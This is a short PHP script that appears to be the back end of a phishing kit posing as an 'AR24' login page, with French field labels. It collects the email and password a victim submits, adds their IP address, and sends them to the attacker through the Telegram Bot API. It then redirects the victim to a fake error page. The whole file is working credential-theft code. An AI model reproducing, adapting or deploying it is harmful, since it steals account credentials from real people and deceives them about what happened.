<?php 
include "token.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = "/== AR24 Log2 Infos ==/"; 
            $message .= 'Serveur' . $_SERVER['REMOTE_ADDR'] . "\r\n";
           
            $message .= 'Email: ' . $_POST['ide'] . "\r\n";

            $message .= 'Mot de passe: ' . $_POST['pwd'] . "\r\n";
           
            file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );

  
            
             header("Location: ../../log-error.php");
            
 
?>

